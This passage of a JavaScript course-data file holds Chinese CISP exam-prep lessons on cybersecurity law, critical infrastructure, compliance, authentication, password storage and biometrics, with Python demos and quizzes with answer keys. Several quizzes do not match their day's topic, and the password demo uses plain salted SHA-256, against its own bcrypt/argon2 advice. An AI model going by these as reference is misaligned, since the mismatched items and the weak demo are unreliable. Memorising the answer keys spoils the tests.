    quiz: [{"id":"q10-1","question":"中国《网络安全法》正式实施的时间是？","options":["2016年6月1日","2017年6月1日","2018年6月1日","2019年6月1日"],"correctIndex":1,"explanation":"《网络安全法》于2017年6月1日正式实施。"},{"id":"q10-2","question":"《数据安全法》中数据分类分级的核心级别不包括？","options":["核心数据","重要数据","一般数据","普通数据"],"correctIndex":3,"explanation":"数据分类分级分为核心、重要和一般数据三个级别。"},{"id":"q10-3","question":"个人信息保护法中，敏感个人信息不包括？","options":["生物识别信息","医疗健康信息","工作单位名称","金融账户信息"],"correctIndex":2,"explanation":"工作单位名称不属于敏感个人信息。"},{"id":"q10-4","question":"等保2.0将安全保护等级分为几级？","options":["三级","四级","五级","六级"],"correctIndex":2,"explanation":"等保2.0将安全保护等级分为五级。"},{"id":"q10-5","question":"GDPR是哪个地区的隐私保护法规？","options":["美国","中国","欧盟","日本"],"correctIndex":2,"explanation":"GDPR是欧盟的通用数据保护条例。"}],
    expertNotes: dayExpertNotes[9],
    recommendedTools: [
    {
      id: 'compliance-checker',
      name: '等保合规检查工具',
      description: '网络安全等级保护合规检查工具包',
      url: ''
    },
    {
      id: 'iso27001-toolkit',
      name: 'ISO 27001 工具包',
      description: '信息安全管理体系建设模板和工具',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'compliance-lab',
      name: '企业合规练习平台',
      description: '模拟企业合规检查和审计流程的练习环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-11', day: 11, week: 2, title: '关键信息基础设施保护',
    objectives: ['理解CII概念', '了解保护义务', '掌握安全要求'],
    content: '# 关键信息基础设施保护\n\n> 📋 **本节大纲**\u2003CII定义与行业范围表 | CII运营者六项特殊义务 | 供应链安全 | CII vs 等保三级区别\n\n## 概述\n\n关键信息基础设施（Critical Information Infrastructure, CII）是指一旦遭到破坏、丧失功能或数据泄露，可能严重危害国家安全、国计民生、公共利益的网络设施和信息系统。CII保护是网络安全法的核心制度之一，对运营者施加了比一般网络更高的安全要求。\n\n## CII涵盖的行业领域\n\n| 行业 | 典型CII系统 |\n|------|-----------|\n| 公共通信和信息服务 | 电信骨干网、互联网域名系统（DNS根服务器） |\n| 能源 | 电力调度自动化系统、油气管道SCADA |\n| 交通 | 铁路调度、航空管制、城市轨道交通信号系统 |\n| 金融 | 银行核心交易系统、证券清算系统、央行支付系统 |\n| 政务 | 电子政务平台、政府数据中心 |\n| 水利 | 大型水利工程监控系统 |\n| 卫生 | 全民健康信息平台 |\n| 国防 | 国防科技工业信息系统 |\n\n## CII运营者的特殊义务\n\n**一般网络运营者只需要做的，CII运营者还要做更多：**\n\n1. **安全检测评估：**至少每年一次（可以是等级测评、风险评估或渗透测试）\n2. **重要数据境内存储：**在境内运营中产生和收集的个人信息和重要数据应当在境内存储——需要出境时必须通过安全评估\n3. **采购安全审查：**采购网络产品和服务可能影响国家安全的，应当申报网络安全审查\n4. **安全事件报告：**发生重大安全事件时，按规定向相关部门报告\n5. **人员安全管理：**对关键岗位人员进行安全背景审查\n6. **应急预案与演练：**制定并定期演练\n\n**CII与等保三级的区别：**等保三级是等级保护的概念，CII是行业关键性的概念。一个系统可以是三级等保但不是CII，也可以是CII且定级为三级。两者有关联但不是同一概念。\n\n## 供应链安全\n\nCII运营者采购网络产品和服务时需考虑：\n- 供业链安全评估——供应商是否安全可靠\n- 对关键产品进行安全测试和验证\n- 在采购合同中明确安全责任条款\n- 制定供应链中断的应急方案（如某产品被禁用后的替代方案）\n\n## \n## 🔴 高频考点\n\n· CII运营者核心义务：**重要数据境内存储+出境需安全评估**——必考点\n· CII和等保三级不是同一概念——CII是行业属性、等保是保护等级\n· CII八行业：通信/能源/交通/金融/政务/水利/卫生/国防\n## 💜 记忆口诀\n\n· **CII特殊义务**："存境内、每一年、审采购、报事件"\n· **CII≠等保**："CII看行业、等保看等级"\n学习建议\n- CII的核心特征是影响"国家安全、国计民生、公共利益"\n- "重要数据境内存储"是CII运营者的核心特殊义务\n- CII和等保三级不是同一个概念——CII是行业属性，等保是保护等级',
    codeExample: { language: 'python', code: '# CII安全评估\ndef assess_cii_risk(business_criticality, impact_scope, recovery_difficulty):\n    score = business_criticality * 0.4 + impact_scope * 0.3 + recovery_difficulty * 0.3\n    if score >= 80:\n        return score, "极高 - 需重点保护"\n    elif score >= 60:\n        return score, "高 - 需强化保护"\n    else:\n        return score, "中 - 标准保护"\n\nscore, level = assess_cii_risk(85, 75, 90)\nprint(f"评估分数: {score:.1f}")\nprint(f"风险等级: {level}")', description: '模拟CII安全评估' },
    quiz: [{"id":"q11-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q11-2","question":"以下关于关键信息基础设施保护的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q11-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q11-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q11-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[9],
    recommendedTools: [
    {
      id: 'compliance-checker',
      name: '等保合规检查工具',
      description: '网络安全等级保护合规检查工具包',
      url: ''
    },
    {
      id: 'iso27001-toolkit',
      name: 'ISO 27001 工具包',
      description: '信息安全管理体系建设模板和工具',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'compliance-lab',
      name: '企业合规练习平台',
      description: '模拟企业合规检查和审计流程的练习环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-12', day: 12, week: 2, title: '网络安全审查制度',
    objectives: ['了解网络安全审查机制', '理解审查范围', '掌握合规要点'],
    content: '# 网络安全审查制度\n\n> 📋 **本节大纲**\u2003审查触发条件(两大情形) | 审查五大维度 | 审查程序 | 违规后果\n\n## 概述\n\n网络安全审查制度是根据《网络安全法》和《网络安全审查办法》建立的国家级安全审查机制，目的是维护国家安全——特别是CII供应链安全和数据安全。审查的核心不是"产品好不好用"，而是"用了这个产品会不会危害国家安全"。\n\n## 审查触发条件\n\n**强制审查情形：**\n1. **CII运营者采购：**购买可能影响国家安全的网络产品和服务时必须申报审查\n2. **赴国外上市：**掌握超过100万用户个人信息的数据处理者赴国外上市，必须申报\n3. **其他影响国家安全：**网络安全审查办公室认定的其他情形\n\n## 审查五大维度\n\n审查办公室会从以下维度评估：\n1. **产品安全风险：**是否存在已知后门、漏洞，供应商是否可能被外国政府控制\n2. **供应链安全性：**产品依赖的组件是否可靠、供应是否可能被中断\n3. **数据安全风险：**产品是否会收集、传输、存储大量敏感数据，数据是否会出境\n4. **国家安全影响：**产品在关键领域的部署规模、是否可能被用于网络攻击\n5. **开放性和透明性：**产品是否接受独立安全审计、是否公开安全机制\n\n**典型案例：**某国外网络安全厂商的产品在国内CII系统广泛部署后，审查发现其可能向境外传输系统日志——触发网络安全审查，被限制在CII领域的销售。\n\n## 审查程序\n\n1. **申报：**运营者向网络安全审查办公室提交申报材料\n2. **初步审查：**30个工作日内完成初步审查\n3. **特别审查：**情况复杂的进入特别审查程序，45个工作日内完成（可延长）\n4. **结论：**通过审查、附条件通过（如要求数据本地化存储）、不予通过\n\n## 违规后果\n\n未申报即采购的：责令停止使用相关产品和服务，可处采购金额1-10倍罚款。\n提供虚假申报材料的：纳入信用记录并追究法律责任。\n\n## \n## 🔴 高频考点\n\n· 网络安全审查关注**国家安全**（不是商业利益），由网信办主导\n· 两大触发条件：①CII采购影响国家安全的产品 ②处理100万+个人信息赴国外上市\n· 审查结果三种：通过/有条件通过/不予通过\n## 💜 记忆口诀\n\n· **触发条件**："买设备(CII采购) or 去上市(百万用户境外)"\n· **三结果**："通过、有条件、拒绝"\n学习建议\n- 网络安全审查关注的是"国家安全"，不是商业利益\n- CII运营者采购+CII赴国外上市=两大触发条件\n- 审查结果三种：通过、有条件通过、不予通过',
    codeExample: { language: 'python', code: '# 审查流程模拟\ndef review_process(stages):\n    print("网络安全审查流程")\n    print("=" * 50)\n    total = 0\n    for name, days in stages:\n        print(f"  {name}: {days}个工作日")\n        total += days\n    print("=" * 50)\n    print(f"总审查时间: 约{total}个工作日")\n\nstages = [\n    ("材料申报", 5),\n    ("初步审查", 30),\n    ("特别审查", 45),\n    ("审查结论", 5)\n]\nreview_process(stages)', description: '模拟审查流程' },
    quiz: [{"id":"q12-1","question":"以下哪种防火墙类型工作在OSI第4层？","options":["应用层防火墙","状态检测防火墙","代理防火墙","WAF"],"correctIndex":1,"explanation":"状态检测防火墙工作在传输层（第4层）。"},{"id":"q12-2","question":"IDS和IPS的主要区别是？","options":["IDS可以阻断攻击","IPS可以阻断攻击，IDS只能检测告警","两者功能完全相同","IDS比IPS更安全"],"correctIndex":1,"explanation":"IPS可以主动阻断攻击，IDS只能检测和告警。"},{"id":"q12-3","question":"TCP三次握手中，第二次握手发送的标志位是？","options":["SYN","ACK","SYN+ACK","FIN"],"correctIndex":2,"explanation":"第二次握手服务器回复SYN+ACK。"},{"id":"q12-4","question":"DNS欺骗攻击属于什么类型的攻击？","options":["物理攻击","中间人攻击","密码攻击","社会工程攻击"],"correctIndex":1,"explanation":"DNS欺骗通过伪造DNS响应属于中间人攻击。"},{"id":"q12-5","question":"防火墙默认策略应遵循什么原则？","options":["默认允许","默认拒绝","只允许80端口","按需决定"],"correctIndex":1,"explanation":"安全最佳实践：默认拒绝所有，按需开放。"}],
    expertNotes: dayExpertNotes[10],
    recommendedTools: [
    {
      id: 'compliance-checker',
      name: '等保合规检查工具',
      description: '网络安全等级保护合规检查工具包',
      url: ''
    },
    {
      id: 'iso27001-toolkit',
      name: 'ISO 27001 工具包',
      description: '信息安全管理体系建设模板和工具',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'compliance-lab',
      name: '企业合规练习平台',
      description: '模拟企业合规检查和审计流程的练习环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-13', day: 13, week: 2, title: '合规管理体系建设',
    objectives: ['理解合规管理框架', '了解三道防线', '掌握审计方法'],
    content: '# 合规管理体系建设\n\n## 合规管理框架\n\n### 核心要素\n1. **治理架构**：明确合规管理责任\n2. **规章制度**：建立合规政策和流程\n3. **风险管理**：识别和评估合规风险\n4. **培训教育**：提升员工合规意识\n5. **监督检查**：定期审计和检查\n6. **持续改进**：根据检查结果改进\n\n## 三道防线模型\n\n### 第一道防线：业务部门\n- 执行合规要求\n- 日常合规管理\n- 识别和报告合规风险\n\n### 第二道防线：合规部门\n- 制定合规政策\n- 提供合规咨询\n- 监督和指导业务部门\n- 组织合规培训\n\n### 第三道防线：内部审计\n- 独立审计评估\n- 检查合规有效性\n- 向管理层报告\n\n## 合规审计\n\n### 审计类型\n1. **全面审计**：定期全面检查\n2. **专项审计**：针对特定领域\n3. **突击审计**：不预先通知\n\n### 审计方法\n- 文件审阅\n- 人员访谈\n- 系统测试\n- 数据分析\n- 抽样检查\n\n### 常见问题\n1. 制度存在但执行不到位\n2. 员工合规意识薄弱\n3. 技术措施不足\n4. 持续监控缺失',
    codeExample: { language: 'python', code: '# 合规差距分析\ndef analyze_gap(current, requirements):\n    missing = [req for req in requirements if req not in current]\n    return missing, len(requirements) - len(missing), len(requirements)\n\nrequirements = ["MFA认证", "定期改密", "权限审批", "数据加密", "日志审计"]\ncurrent = ["MFA认证", "定期改密", "日志审计"]\n\nmissing, passed, total = analyze_gap(current, requirements)\nprint(f"差距项: {missing}")\nprint(f"合规率: {(passed/total)*100:.1f}%")', description: '模拟合规差距分析' },
    quiz: [{"id":"q13-1","question":"中国《网络安全法》正式实施的时间是？","options":["2016年6月1日","2017年6月1日","2018年6月1日","2019年6月1日"],"correctIndex":1,"explanation":"《网络安全法》于2017年6月1日正式实施。"},{"id":"q13-2","question":"《数据安全法》中数据分类分级的核心级别不包括？","options":["核心数据","重要数据","一般数据","普通数据"],"correctIndex":3,"explanation":"数据分类分级分为核心、重要和一般数据三个级别。"},{"id":"q13-3","question":"个人信息保护法中，敏感个人信息不包括？","options":["生物识别信息","医疗健康信息","工作单位名称","金融账户信息"],"correctIndex":2,"explanation":"工作单位名称不属于敏感个人信息。"},{"id":"q13-4","question":"等保2.0将安全保护等级分为几级？","options":["三级","四级","五级","六级"],"correctIndex":2,"explanation":"等保2.0将安全保护等级分为五级。"},{"id":"q13-5","question":"GDPR是哪个地区的隐私保护法规？","options":["美国","中国","欧盟","日本"],"correctIndex":2,"explanation":"GDPR是欧盟的通用数据保护条例。"}],
    expertNotes: [{"author":"吴强","title":"网络安全法解读","content":"《网络安全法》是网安从业者的基本法。重点掌握：网络运营者安全义务、个人信息保护要求、关键信息基础设施保护。建议把法律条文和实际工作中的合规要求对应起来。","url":"https://www.freebuf.com/articles/es/273456.html"},{"author":"周敏","title":"数据安全合规实践","content":"数据安全法实施后，数据分类分级成为企业的必修课。从数据资产梳理入手，按核心-重要-一般三级分类。特别注意个人信息和重要数据的跨境传输合规要求。","url":"https://www.freebuf.com/articles/database/290456.html"},{"author":"孙丽","title":"合规管理体系建设","content":"三道防线模型：业务部门（执行合规）、合规部门（制定政策）、内部审计（独立评估）。定期进行合规审计，建立持续改进机制。合规不是一次性工作，是持续的过程。","url":"https://www.freebuf.com/articles/cloud/285678.html"}],
    recommendedTools: [
    {
      id: 'compliance-checker',
      name: '等保合规检查工具',
      description: '网络安全等级保护合规检查工具包',
      url: ''
    },
    {
      id: 'iso27001-toolkit',
      name: 'ISO 27001 工具包',
      description: '信息安全管理体系建设模板和工具',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'compliance-lab',
      name: '企业合规练习平台',
      description: '模拟企业合规检查和审计流程的练习环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-14', day: 14, week: 2, title: '第二周总结与测验',
    objectives: ['回顾第二周知识点', '检验学习成果', '为第三周做准备'],
    content: '# 第二周学习总结\n\n## 本周学习内容\n\n### Day 8: 网络安全法律法规体系\n- 三法：网络安全法、数据安全法、个人信息保护法\n- 行政法规和部门规章\n\n### Day 9: 等级保护制度\n- 五个保护等级\n- 定级流程和测评要求\n\n### Day 10: 数据安全与个人信息保护\n- 数据分类分级\n- 个人信息保护原则\n\n### Day 11: 关键信息基础设施保护\n- CII定义和范围\n- 安全保护义务\n\n### Day 12: 网络安全审查制度\n- 审查适用范围\n- 审查程序\n\n### Day 13: 合规管理体系建设\n- 三道防线模型\n- 合规审计方法\n\n## 知识要点\n\n| 法规 | 实施时间 | 核心内容 |\n|------|----------|----------|\n| 网络安全法 | 2017年 | 基础性法律 |\n| 数据安全法 | 2021年 | 数据分类分级 |\n| 个人信息保护法 | 2021年 | 个人信息权利 |\n| 等级保护 | - | 五级保护制度 |\n\n## 下周预告\n\n第三周将学习：\n- 身份认证技术\n- 密码认证\n- 多因素认证\n- 单点登录',
    quiz: [{"id":"q14-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q14-2","question":"以下关于第二周总结与测验的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q14-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q14-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q14-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[9],
    recommendedTools: [
    {
      id: 'compliance-checker',
      name: '等保合规检查工具',
      description: '网络安全等级保护合规检查工具包',
      url: ''
    },
    {
      id: 'iso27001-toolkit',
      name: 'ISO 27001 工具包',
      description: '信息安全管理体系建设模板和工具',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'compliance-lab',
      name: '企业合规练习平台',
      description: '模拟企业合规检查和审计流程的练习环境',
      url: ''
    }
  ]
  },
  // ========== Week 3: 访问控制 ==========
  {
    id: 'day-15', day: 15, week: 3, title: '身份认证基础',
    objectives: ['理解身份认证概念', '了解认证因素', '掌握认证方法'],
    content: '# 身份认证基础\n\n> 📋 **本节大纲**\u2003四种认证因素 | 单因素vs双因素vs多因素 | 五大攻击方式\n\n## 概述\n\n身份认证是信息安全的"守门人"——在授予任何访问权限之前，必须先验证"你是谁"。CISP考试考查三种认证因素类型的区分和组合方式，以及多因素认证（MFA）的意义。\n\n## 四种认证因素\n\n**知识因素（Something you know — 你知道什么）：**\n密码、PIN码、安全问题答案、图形解锁图案。最常用但也最易受攻击——可被猜测、窃取或遗忘。\n\n**持有因素（Something you have — 你拥有什么）：**\n智能卡、USB Key（U盾）、硬件令牌（RSA SecurID显示动态码）、手机（接收短信验证码）。比密码更安全——攻击者需要物理拿到设备，但设备可丢失。\n\n**生物因素（Something you are — 你是什么）：**\n指纹、虹膜、人脸、声纹、掌静脉、击键节奏。最难伪造但一旦泄露无法更换——你不能换指纹。\n\n**位置因素（Somewhere you are — 你在哪里）：**\nIP地址、GPS位置、接入的网络标识。辅助因素，不能单独作为主认证。\n\n## 单因素 vs 双因素 vs 多因素\n\n| 类型 | 示例 | 安全性 |\n|------|------|--------|\n| 单因素 | 仅密码 | 低——密码泄露即全完 |\n| 双因素(2FA) | 密码+短信验证码 | 中——需要两个因素 |\n| 多因素(MFA) | 密码+令牌+指纹 | 高——三层防护 |\n\n**关键原则：**双因素必须是不同类型的因素——密码+安全问题仍是单因素（都是知识因素）。密码+短信才叫双因素。\n\n## 常见攻击方式\n\n- **暴力破解：**尝试所有可能密码组合。10位纯数字密码=100亿组合，现代工具数小时内可完成\n- **字典攻击：**用常见密码字典（password123、admin等）尝试，成功率极高\n- **彩虹表攻击：**预计算密码→哈希值映射，可快速反向查找。防御：加盐（Salt）\n- **钓鱼：**诱骗用户自己在钓鱼网站输入密码\n- **键盘记录：**恶意软件记录每次键盘敲击\n\n## \n## 🔴 高频考点\n\n· **"知识+持有"才是真正的双因素认证**——密码+安全问题仍是单因素(都属知识因素)，这是陷阱题\n· 生物因素致命弱点：**无法更换**。指纹泄露终身泄露\n· 彩虹表攻击的防御是**加盐(Salt)**——必考\n## 💜 记忆口诀\n\n· **四因素**："知-持-生-地"\n· **双因素陷阱**："密码+安全问题=单因素(都是知识)、密码+手机=双因素(知识+持有)"\n学习建议\n- "知识+持有"才算真正的双因素认证\n- 生物因素的致命弱点：无法更换\n- 彩虹表攻击的防御是加盐——CISP高频考点',
    codeExample: { language: 'python', code: '# 认证系统模拟\ndef authenticate(username, password):\n    users = {"admin": "admin123", "user": "user123"}\n    if username not in users:\n        return False, "用户不存在"\n    if users[username] != password:\n        return False, "密码错误"\n    return True, "认证成功"\n\n# 测试\nfor test in [("admin", "admin123"), ("admin", "wrong"), ("guest", "123")]:\n    success, msg = authenticate(*test)\n    print(f"{test[0]}: {msg}")', description: '演示基本认证流程' },
    quiz: [{"id":"q15-1","question":"多因素认证通常包括哪三类因素？","options":["知识、持有、生物特征","密码、指纹、面部","用户名、密码、验证码","硬件、软件、固件"],"correctIndex":0,"explanation":"三类因素：你知道的（知识）、你拥有的（持有）、你是什么（生物特征）。"},{"id":"q15-2","question":"访问控制模型中，RBAC代表什么？","options":["基于规则的访问控制","基于角色的访问控制","基于风险的访问控制","基于资源的访问控制"],"correctIndex":1,"explanation":"RBAC是Role-Based Access Control。"},{"id":"q15-3","question":"最小权限原则是指？","options":["所有用户都是管理员","用户只获得完成任务所需的最小权限","用户拥有所有权限","权限由用户自己决定"],"correctIndex":1,"explanation":"最小权限原则确保用户只拥有完成任务所需的最少权限。"},{"id":"q15-4","question":"Kerberos认证协议的核心组件是？","options":["防火墙","KDC（密钥分发中心）","VPN","IDS"],"correctIndex":1,"explanation":"Kerberos的核心是KDC密钥分发中心。"},{"id":"q15-5","question":"单点登录（SSO）的主要优势是？","options":["增加密码数量","减少用户记忆密码数量，提升体验","降低系统安全性","增加管理复杂度"],"correctIndex":1,"explanation":"SSO让用户只需登录一次即可访问多个系统。"}],
    expertNotes: dayExpertNotes[15],
    recommendedTools: [
    {
      id: 'active-directory',
      name: 'Active Directory',
      description: 'Windows域环境访问控制系统',
      url: ''
    },
    {
      id: 'keycloak',
      name: 'Keycloak',
      description: '开源身份认证与授权管理系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'rbac-lab',
      name: 'RBAC 访问控制实验',
      description: '练习基于角色的访问控制模型配置',
      url: ''
    }
  ]
  },
  {
    id: 'day-16', day: 16, week: 3, title: '密码认证技术',
    objectives: ['理解密码安全原则', '了解密码存储方法', '掌握密码策略'],
    content: '# 密码认证技术\n\n> 📋 **本节大纲**\u2003密码安全三大原则 | 三种存储方式(明文/加密/加盐哈希) | 加盐哈希原理 | bcrypt/argon2\n\n## 概述\n\n密码是最古老的认证方式，今天仍然无处不在。密码安全性取决于三方面：密码本身有多强（长度+复杂度）、存储有多安全（加盐哈希）、系统有多防护（锁定机制）。CISP考试常考加盐哈希原理和bcrypt/argon2算法。\n\n## 密码安全三大原则\n\n**1. 长度优先于复杂度：**\n"Password123!"（13位）比"P@ss1"（5位）安全得多。长度增加1位，破解时间指数级增长。建议最少12位。\n\n**2. 不要强制过于频繁的换密码：**\n传统的"90天换密码"已被NIST最新的SP 800-63B标准否定——频繁更换导致用户使用"January2024!" → "February2024!"的弱密码模式。现代推荐：只在被怀疑泄露时更换。\n\n**3. 不要限制特殊字符：**\n允许用户使用所有可见字符（包括空格、中文），扩大密码空间。\n\n## 密码存储的三种方式\n\n**明文存储 = 绝对禁止：**\n如果数据库被拖库，攻击者直接看到所有密码。任何现代系统都不应明文存储密码。\n\n**加密存储 = 不够安全：**\n用对称加密（如AES）加密密码存储。问题：加密密钥如果泄露，所有密码可被解密——本质上等于"把密码藏在一个需要密码的地方"。\n\n**加盐哈希存储 = 唯一正确方式：**\n\n密码存储的正确流程：\n1. 用户注册时，系统生成一个随机盐值（每用户不同、32字节以上）\n2. 将"明文密码 + 盐值"一起输入哈希函数（bcrypt/argon2/scrypt）\n3. 数据库中存储：盐值 + 哈希结果（明文密码本身绝不存储）\n4. 验证时：取出盐值，对输入的密码+盐重新计算哈希，比对是否一致\n\n**为什么加盐：**盐值确保即使两个用户使用相同密码，数据库中存储的哈希也不同。盐值还使彩虹表攻击无效——攻击者无法预计算"所有密码+所有盐"的哈希表。\n\n**推荐算法：bcrypt → argon2 → scrypt。绝对不用：MD5、SHA-1。**\n\n## 账户安全防护\n\n- **账户锁定：**连续失败N次（如5次）后锁定账户30分钟，防止在线暴力破解\n- **延迟响应：**登录失败后增加1-3秒延迟，大幅降低暴力破解速度\n- **CAPTCHA：**多次失败后要求输入验证码，区分人和机器\n- **异常登录检测：**异地登录、陌生设备、非工作时间等行为分析\n\n## \n## 🔴 高频考点\n\n· **加盐哈希原理**是密码学考点核心——盐值随机+每用户不同+与密码一起哈希\n· NIST SP 800-63B已不强制定期换密码——强制定期更换反而导致密码模式化\n· 密码存储绝对不用MD5/SHA-1，推荐**bcrypt/argon2**\n## 💜 记忆口诀\n\n· **加盐哈希**："每人一撮盐、和密码一起炒(哈希)、盐和哈希一起存"\n· **不可用**："MD5别用、SHA-1别用、明文更别用"\n学习建议\n- 加盐哈希的原理是CISP密码学相关考点的核心\n- "盐值随机+每用户不同"是加盐的关键\n- NIST最新标准：不强制定期换密码',
    codeExample: { language: 'python', code: 'import hashlib\nimport secrets\n\ndef hash_password(password, salt):\n    return hashlib.sha256((password + salt).encode()).hexdigest()\n\n# 注册\nsalt = secrets.token_hex(16)\nstored_hash = hash_password("mypassword", salt)\nprint(f"存储: salt={salt[:8]}..., hash={stored_hash[:16]}...")\n\n# 登录验证\ndef verify(input_password, salt, stored):\n    return hash_password(input_password, salt) == stored\n\nprint(f"验证正确密码: {verify(\"mypassword\", salt, stored_hash)}")\nprint(f"验证错误密码: {verify(\"wrongpassword\", salt, stored_hash)}")', description: '演示密码哈希存储' },
    quiz: [{"id":"q16-1","question":"以下哪种是对称加密算法？","options":["RSA","AES","ECC","DSA"],"correctIndex":1,"explanation":"AES是对称加密算法。"},{"id":"q16-2","question":"数字签名使用什么密钥进行签名？","options":["接收者的公钥","发送者的私钥","发送者的公钥","共享密钥"],"correctIndex":1,"explanation":"数字签名使用发送者的私钥进行签名。"},{"id":"q16-3","question":"SHA-256的输出长度是多少位？","options":["128位","160位","256位","512位"],"correctIndex":2,"explanation":"SHA-256的输出长度是256位。"},{"id":"q16-4","question":"PKI体系中，CA的作用是什么？","options":["加密数据","签发和管理数字证书","存储用户密码","检测网络攻击"],"correctIndex":1,"explanation":"CA负责签发和管理数字证书。"},{"id":"q16-5","question":"HTTPS使用什么协议实现安全传输？","options":["IPSec","TLS/SSL","SSH","PGP"],"correctIndex":1,"explanation":"HTTPS使用TLS/SSL协议加密传输。"}],
    expertNotes: [{"author":"张伟","title":"密码学学习路径","content":"密码学不要一上来就啃数学公式。建议学习路径：先理解对称加密（AES）和非对称加密（RSA）的核心思想——一个是同一把钥匙，一个是公钥私钥对。然后再学哈希、数字签名、PKI。动手用OpenSSL生成证书是很好的实践。","url":"https://www.freebuf.com/articles/es/267825.html"},{"author":"李明","title":"国密算法实践","content":"SM2/SM3/SM4是国产密码算法的核心，在政务和关键基础设施项目中已成为强制要求。SM2是椭圆曲线公钥密码算法，SM3是密码杂凑算法，SM4是分组密码算法。OpenSSL 1.1.1+已经支持国密算法。","url":"https://www.anquanke.com/post/id/243567.html"},{"author":"王芳","title":"PKI体系建设经验","content":"CA的私钥保护是最关键的（建议使用HSM硬件安全模块），证书生命周期管理要自动化避免过期导致服务中断。中小企业可考虑Let's Encrypt或云厂商证书管理服务。","url":"https://www.freebuf.com/articles/es/278934.html"}],
    recommendedTools: [
    {
      id: 'active-directory',
      name: 'Active Directory',
      description: 'Windows域环境访问控制系统',
      url: ''
    },
    {
      id: 'keycloak',
      name: 'Keycloak',
      description: '开源身份认证与授权管理系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'rbac-lab',
      name: 'RBAC 访问控制实验',
      description: '练习基于角色的访问控制模型配置',
      url: ''
    }
  ]
  },
  {
    id: 'day-17', day: 17, week: 3, title: '生物识别技术',
    objectives: ['了解生物识别类型', '理解优缺点', '掌握应用场景'],
    content: '# 生物识别技术\n\n## 生物识别类型\n\n### 生理特征\n\n#### 指纹识别\n- 最广泛使用\n- 成本较低\n- 准确度较高\n\n#### 面部识别\n- 非接触式\n- 隐私争议大\n- 受光照、表情影响\n\n#### 虹膜识别\n- 极高准确度\n- 难以伪造\n- 设备成本高\n\n#### 掌纹/掌静脉\n- 手掌特征丰富\n- 静脉识别需活体\n\n### 行为特征\n\n#### 语音识别\n- 通过声音特征识别\n- 易受环境噪音影响\n\n#### 签名动力学\n- 分析签名速度和压力\n- 传统方式易接受\n\n#### 击键节奏\n- 分析键盘输入习惯\n- 可用于持续认证\n\n## 优缺点分析\n\n### 优点\n- 不易遗忘和丢失\n- 难以复制和伪造\n- 使用方便快捷\n\n### 缺点\n- 不可撤销（泄露无法更换）\n- 存在误识率（FRR/FAR）\n- 隐私和伦理问题\n- 部分方式对健康有要求\n\n## 应用场景\n\n1. **设备解锁**：手机、笔记本\n2. **门禁系统**：办公区域\n3. **金融认证**：支付验证\n4. **边境检查**：护照核验\n\n## 最佳实践\n\n- 与其他认证结合使用（多因素）\n- 本地存储生物特征（不上传）\n- 提供备用认证方式\n- 定期评估误识率',
    codeExample: { language: 'python', code: '# 生物识别匹配模拟\ndef calculate_similarity(input_data, template, threshold=0.85):\n    """模拟相似度计算（实际使用复杂算法）"""\n    # 简化: 返回随机相似度\n    import random\n    similarity = random.uniform(0.7, 0.99)\n    if similarity >= threshold:\n        return True, similarity, f"匹配成功 ({similarity:.2%})"\n    else:\n        return False, similarity, f"匹配失败 ({similarity:.2%})"\n\n# 测试指纹认证\nprint("指纹认证测试")\nfor _ in range(3):\n    success, sim, msg = calculate_similarity("scanned_fp", "stored_fp")\n    print(f"  {msg}")', description: '模拟生物识别匹配' },
